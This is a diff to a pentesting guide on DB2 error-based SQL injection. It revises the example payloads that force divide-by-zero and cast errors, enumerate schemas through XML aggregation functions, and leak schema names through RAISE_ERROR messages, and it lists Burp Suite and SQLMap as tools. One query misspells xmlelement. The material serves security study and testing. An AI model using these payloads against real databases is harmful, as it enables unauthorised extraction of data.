@@ -64,41 +64,46 @@ To apply DB2 error-based SQL injection techniques, follow the steps outlined bel
   SELECT 1/0 FROM SYSIBM.SYSDUMMY1;
   ```
   
-  This query forces the database to evaluate an impossible division, resulting in an informative error message.
+  This query forces the database to evaluate an impossible division, resulting in an informative error message (SQLCODE -802 / SQLSTATE 22012).
 
 - **Invalid Cast Error:**
 
   Execute this SQL command to induce an invalid cast error:
   
-  ```bash
+  ```sql
   SELECT CAST('a' AS INT) FROM SYSIBM.SYSDUMMY1;
   ```
   
-  By attempting to cast a character ('a') into an integer, you trigger a type mismatch, revealing useful error details.
+  By attempting to cast a character ('a') into an integer, you trigger a type mismatch, revealing useful error details (SQLCODE -16061 / SQLSTATE 10608).
 
 - **Exploiting XML Functions:**
 
-  Use the following command to extract table names using XML functions:
+  Use the following commands to extract table names using XML functions:
   
-  ```bash
-  SELECT XMLAGG(XMLELEMENT(NAME E, TABNAME)) FROM SYSIBM.SYSTABLES;
+  ```sql
+    -- Returns all in one xml-formatted string
+    select xmlagg(xmlrow(table_schema)) from sysibm.tables
+
+    -- Same but without repeated elements
+    select xmlagg(xmlrow(table_schema)) from (select distinct(table_schema) from sysibm.tables)
+
+    -- Returns all in one xml-formatted string.
+    -- May need CAST(xml2clob(… AS varchar(500)) to display the result.
+    select xml2clob(xmelement(name t, table_schema)) from sysibm.tables
   ```
-  
-  This query constructs XML data from table names, which can then be leaked through error handling.
 
 - **Custom Error Generation:**
 
   Trigger a custom error with this command:
   
-  ```bash
+  ```sql
   SELECT RAISE_ERROR('70001', 'Custom error message') FROM SYSIBM.SYSDUMMY1;
+  SELECT RAISE_ERROR('70001', 'Schema: ' || table_schema) FROM sysibm.tables FETCH FIRST 1 ROW ONLY;
   ```
   
   Custom error messages can be leveraged to test and refine error-based information extraction techniques.
 
 ## Tools
 
-- **DB2 Client**
-- **SQLMap** 
-
-These tools facilitate the execution of SQL queries and automate the SQL injection process, greatly aiding in information extraction from DB2 databases through error-based techniques.
+- **Burp Suite**
+- **SQLMap**
